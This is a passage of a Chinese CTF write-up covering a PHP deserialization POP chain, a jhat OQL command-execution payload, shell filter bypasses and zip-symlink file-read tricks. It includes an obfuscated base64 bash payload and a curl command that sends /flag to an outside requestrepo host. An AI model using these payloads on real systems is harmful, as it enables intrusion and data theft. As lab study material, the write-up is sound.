class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;begin&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;begin&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>pop链构造，<code>class B</code>中的<code>__destruct</code>为入口方法，<code>class Fun</code>中的<code>__call</code>为最终方法。当时一直以为要去调用<code>Test</code>中的<code>__call</code>导致没做出来:(现在想想既然<code>Fun</code>类下都给回调函数了直接执行命令就好：</p><p><code>B</code> - &gt; <code>A</code> - &gt; <code>Fun </code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fun</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;call_user_func_array&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func,<span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span>);<br>&#125;<br>&#125;<br> <br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/Test/&quot;</span>,<span class="hljs-title function_ invoke__">get_class</span>(<span class="hljs-variable">$this</span>-&gt;a)))&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No test in Prod\n&quot;</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-variable">$p</span>();<br>&#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-variable">$p</span>;<br>&#125;<br>&#125;<br> <br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Fun</span>();<br><span class="hljs-variable">$a</span>-&gt;a=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$a</span>-&gt;p=<span class="hljs-string">&#x27;phpinfo&#x27;</span>;<br><span class="hljs-variable">$b</span>-&gt;a=<span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>首先实例化B,A,Fun类。$a中的a属性赋值为B类的一个实例。$a的p属性赋值为phpinfo。因为Class A并没声明p属性，就会触发__get()魔术方法。 因为存在<code>return $this-&gt;a-&gt;$p()</code>(也就是调用Fun实例的phpinfo()方法，但并不存在这个方法)从而触发call魔术方法。<code>__call($f, $p)</code> 方法中 <code>$f</code> 是尝试调用的方法名，而 <code>$p</code> 是传递给该方法的参数数组，最后就成了<code>call_user_func_array(&quot;phpinfo&quot;, null)</code>这么个东西。</p><h3 id="HGAME-jhat"><a href="#HGAME-jhat" class="headerlink" title="[HGAME]jhat"></a>[HGAME]jhat</h3><p><a href="https://blog.csdn.net/Jayjay___/">参考资料</a></p><p>利用OQL实现RCE:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>CURL带出flag:<br>首先我们需要执行的命令是类似：<br>curl  http:<span class="hljs-regexp">//</span>`cat <span class="hljs-regexp">/flag`.i5yh54u0.requestrepo.com/</span><br></code></pre></td></tr></table></figure><p>但注意Runtime.exec不会解析Shell命令或Shell特性（如管道|、重定向&gt;、反引号等）。它只是简单地将提供的字符串作为命令执行，而不经过Shell解释器，因此无法理解或执行嵌入的子命令。要使用这些特性，需要显式地调用Shell并将整个命令字符串作为Shell命令的一部分传递，例如使用bash -c “命令”显式调用Shell，并将整个命令作为字符串传递给Shell。这样就可以利用Shell来解析和执行复杂的命令行特性，包括管道和命令替换:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">&#x27;bash -c &#123;echo,Y3VybCAgaHR0cDovL2BjYXQgL2ZsYWdgLnRzY2Y1YjNkLnJlcXVlc3RyZXBvLmNvbS8=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.Runtime.getRuntime().exec(<span class="hljs-string">&#x27;bash -c &#123;echo,Y3VybCAgaHR0cDovL2BjYXQgL2ZsYWdgLnRzY2Y1YjNkLnJlcXVlc3RyZXBvLmNvbS8=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="BeginCTF-readbooks"><a href="#BeginCTF-readbooks" class="headerlink" title="[BeginCTF]readbooks"></a>[BeginCTF]readbooks</h3><p><a href="https://blog.csdn.net/uuzeray/article/details/136032992">参考资料</a></p><p>根据路由<code>public/book1</code>,<code>public/book2</code>可以推测是读取文件，然后利用<code>*</code>这个东西可以实现文件读取：</p><p><code>public/a*</code>(去读a开头的文件)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#app.py:</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template<br><br>app = Flask(__name__)<br><br>DISALLOWED1 = [<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;!&#x27;</span>, <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>]<br>DISALLOWED_FILES = [<span class="hljs-string">&#x27;app.py&#x27;</span>, <span class="hljs-string">&#x27;templates&#x27;</span>, <span class="hljs-string">&#x27;etc&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;blacklist&#x27;</span>]<br>BLACKLIST = [x[:-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./blacklist.txt&quot;</span>).readlines()][:-<span class="hljs-number">1</span>]<br><br>BLACKLIST.append(<span class="hljs-string">&quot;/&quot;</span>)<br>BLACKLIST.append(<span class="hljs-string">&quot;\\&quot;</span>)<br>BLACKLIST.append(<span class="hljs-string">&quot; &quot;</span>)<br>BLACKLIST.append(<span class="hljs-string">&quot;\t&quot;</span>)<br>BLACKLIST.append(<span class="hljs-string">&quot;\n&quot;</span>)<br>BLACKLIST.append(<span class="hljs-string">&quot;tc&quot;</span>)<br><br>ALLOW = [<br>    <span class="hljs-string">&quot;&#123;&quot;</span>,<br>    <span class="hljs-string">&quot;&#125;&quot;</span>,<br>    <span class="hljs-string">&quot;[&quot;</span>,<br>    <span class="hljs-string">&quot;pwd&quot;</span>,<br>    <span class="hljs-string">&quot;-&quot;</span>,<br>    <span class="hljs-string">&quot;_&quot;</span><br>]<br><br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> ALLOW:<br>    <span class="hljs-keyword">try</span>:<br>        BLACKLIST.remove(a)<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/public/&lt;path:name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readbook</span>(<span class="hljs-params">name</span>):<br>    name = <span class="hljs-built_in">str</span>(name)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> DISALLOWED1:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;banned!&quot;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> DISALLOWED_FILES:<br>        <span class="hljs-keyword">if</span> j <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;banned!&quot;</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> BLACKLIST:<br>        <span class="hljs-keyword">if</span> k <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;banned!&quot;</span><br>    <span class="hljs-built_in">print</span>(name)<br>    <span class="hljs-keyword">try</span>:<br>        res = os.popen(<span class="hljs-string">&#x27;cat &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name)).read()<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/list/&lt;path:name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">listbook</span>(<span class="hljs-params">name</span>):<br>    name = <span class="hljs-built_in">str</span>(name)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> DISALLOWED1:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;banned!&quot;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> DISALLOWED_FILES:<br>        <span class="hljs-keyword">if</span> j <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;banned!&quot;</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> BLACKLIST:<br>        <span class="hljs-keyword">if</span> k <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;banned!&quot;</span><br>    <span class="hljs-built_in">print</span>(name)<br>    cmd = <span class="hljs-string">&#x27;ls &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name)<br>    <span class="hljs-keyword">try</span>:<br>        res = os.popen(cmd).read()<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">8878</span>)<br></code></pre></td></tr></table></figure><p>思路就是通过<code>echo</code>和引号&#x2F;反引号实现对特定文件的读取：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">`<span class="hljs-built_in">echo</span> /flag` -&gt; 过滤了<span class="hljs-built_in">echo</span>和空格<br>`ec<span class="hljs-string">&quot;&quot;</span>ho<span class="hljs-variable">$&#123;IFS&#125;</span>/flag` -&gt; 过滤了/及flag<br>`ec<span class="hljs-string">&quot;&quot;</span>ho<span class="hljs-variable">$&#123;IFS&#125;</span>L19mbGFn|<span class="hljs-string">&#x27;ba&#x27;</span><span class="hljs-string">&#x27;se64&#x27;</span><span class="hljs-variable">$&#123;IFS&#125;</span>-d` //flag位于/_flag<br></code></pre></td></tr></table></figure><h3 id="BeginCTF-zupload-pro-plus-max-ultra-premium"><a href="#BeginCTF-zupload-pro-plus-max-ultra-premium" class="headerlink" title="[BeginCTF]zupload-pro-plus-max-ultra-premium"></a>[BeginCTF]zupload-pro-plus-max-ultra-premium</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;./upload&#x27;</span>));<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$file_tmp</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_size</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>];<br>    <span class="hljs-variable">$file_error</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;error&#x27;</span>];<br>    <br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file_name</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$file_ext</span>));<br>    <br>    <span class="hljs-variable">$allowed</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;zip&#x27;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$allowed</span>) &amp;&amp; (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>())-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$file_tmp</span>) === <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_error</span> === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_size</span> &lt;= <span class="hljs-number">2097152</span>) &#123;<br>                <span class="hljs-variable">$file_name_new</span> = <span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-literal">true</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file_ext</span>;<br>                <span class="hljs-variable">$file_destination</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span> . <span class="hljs-variable">$file_name_new</span>;<br>    <br>                <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file_tmp</span>, <span class="hljs-variable">$file_destination</span>)) &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>                        <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,<br>                        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;Failed to upload file&#x27;</span><br>                    ));<br>                &#125;<br><br>                <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;unzip &#x27;</span> . <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$file_destination</span>) . <span class="hljs-string">&#x27; -d &#x27;</span> . <span class="hljs-string">&#x27;uploads/&#x27;</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>                    <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>,<br>                    <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span>,<br>                    <span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&#x27;/\?/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="hljs-number">0</span>] . <span class="hljs-variable">$file_destination</span><br>                ));<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,<br>            <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;Only zip files are allowed&#x27;</span><br>        ));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>后台解压缩上传的文件，但只能下载不能访问</p><p>两种解法，第一种就是上传完软链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /flag myflag<br>zip --symlink 1.zip myflag<br></code></pre></td></tr></table></figure><p>然后直接访问<code>uploads/myflag</code></p><p>第二种解法就是写马(CISCN2023 Unzip)</p><h3 id="BeginCTF-zupload-pro-plus-enhanced"><a href="#BeginCTF-zupload-pro-plus-enhanced" class="headerlink" title="[BeginCTF]zupload-pro-plus-enhanced"></a>[BeginCTF]zupload-pro-plus-enhanced</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: /?action=upload&#x27;</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;/&#x27;</span> || <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-string">&#x27;/&#x27;</span>) &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]));<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$file_tmp</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_size</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>];<br>    <span class="hljs-variable">$file_error</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;error&#x27;</span>];<br>    <br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file_name</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>[<span class="hljs-number">1</span>]);<br>    <br>    <span class="hljs-variable">$allowed</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;zip&#x27;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$allowed</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_error</span> === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_size</span> &lt;= <span class="hljs-number">2097152</span>) &#123;<br>                <span class="hljs-variable">$file_destination</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br>    <br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file_tmp</span>, <span class="hljs-variable">$file_destination</span>)) &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>                        <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>,<br>                        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span>,<br>                        <span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&#x27;/\?/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="hljs-number">0</span>] . <span class="hljs-variable">$file_destination</span><br>                    ));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,<br>            <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;Only zip files are allowed&#x27;</span><br>        ));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>利用点是这段：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = <span 